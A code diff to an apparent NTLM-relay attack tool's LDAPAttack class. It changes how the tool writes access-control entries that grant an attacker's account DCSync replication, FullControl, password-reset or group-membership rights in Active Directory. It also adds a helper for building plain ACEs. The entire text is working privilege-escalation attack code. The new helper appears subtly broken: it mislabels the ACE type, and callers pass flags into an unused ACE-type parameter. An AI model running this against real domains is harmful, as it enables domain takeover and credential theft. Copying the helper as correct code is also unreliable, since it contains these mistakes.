@@ -354,7 +354,8 @@ class LDAPAttack(ProtocolAttack):
     def aclAttack(self):
         rights = {
                 'dcsync':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'], EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All']],
-                'all':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'],EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All'], EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password'], EXTENDED_RIGHTS_NAME_MAP['Self-Membership']],
+                #'all':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'],EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All'], EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password'], EXTENDED_RIGHTS_NAME_MAP['Self-Membership']],
+                'all':[SIMPLE_PERMISSIONS.FullControl.value],
                 'resetpassword':[EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password']],
                 'writemembers':[EXTENDED_RIGHTS_NAME_MAP['Self-Membership']]
             }
@@ -392,8 +393,11 @@ class LDAPAttack(ProtocolAttack):
                 aceflags = ACE.CONTAINER_INHERIT_ACE + ACE.OBJECT_INHERIT_ACE
         
             if self.args.rights.lower() in list(rights.keys()):
-                for guid in rights[self.args.rights.lower()]:
-                    secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid, aceflags))
+                if self.args.rights.lower() == "all":
+                    secDesc['Dacl']['Data'].append(create_ace(SIMPLE_PERMISSIONS.FullControl.value, usersid, aceflags))
+                else:
+                    for guid in rights[self.args.rights.lower()]:
+                        secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid, aceflags))
             else:
                 LOG.error(f'{self.args.rights} right is not valid')
                 return
@@ -953,6 +957,24 @@ class LDAPAttack(ProtocolAttack):
             domainDumper.domainDump()
             LOG.info('Domain info dumped into lootdir!')
 
+# Builds a standard ACE for a specified access mask (rights) and a specified SID (the principal who obtains the right)
+# https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/72e7c7ea-bc02-4c74-a619-818a16bf6adb
+#   - access_mask : the allowed access mask
+#   - sid : the principal's SID
+#   - ace_type : the ACE type (allowed or denied)
+def create_ace(access_mask, sid, ace_type, aceflags=0x00):
+    nace = ldaptypes.ACE()
+    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
+    nace['AceFlags'] = aceflags
+    acedata = ldaptypes.ACCESS_ALLOWED_ACE()
+    acedata['Mask'] = ldaptypes.ACCESS_MASK()
+    acedata['Mask']['Mask'] = access_mask
+    acedata['Sid'] = ldaptypes.LDAP_SID()
+    acedata['Sid'].fromCanonical(sid)
+    nace['Ace'] = acedata
+    logging.debug('ACE created.')
+    return nace
+
 # Create an object ACE with the specified privguid and our sid
 def create_object_ace(privguid, sid, aceflags=0x00):
     nace = ldaptypes.ACE()
@@ -961,7 +983,11 @@ def create_object_ace(privguid, sid, aceflags=0x00):
     acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
     #acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
-    acedata['Mask']['Mask'] = 983551 # Full control
+    if privguid == EXTENDED_RIGHTS_NAME_MAP['Self-Membership']:
+        acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP + ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
+    else:
+        acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
+    #acedata['Mask']['Mask'] = 983551 # Full control
     acedata['ObjectType'] = string_to_bin(privguid)
     acedata['InheritedObjectType'] = b''
     acedata['Sid'] = ldaptypes.LDAP_SID()
@@ -978,7 +1004,7 @@ def create_allow_ace(sid, aceflags=0x00):
     nace['AceFlags'] = aceflags
     acedata = ldaptypes.ACCESS_ALLOWED_ACE()
     acedata['Mask'] = ldaptypes.ACCESS_MASK()
-    acedata['Mask']['Mask'] = 983551 # Full control
+    acedata['Mask']['Mask'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS
     acedata['Sid'] = ldaptypes.LDAP_SID()
     acedata['Sid'].fromCanonical(sid)
     nace['Ace'] = acedata
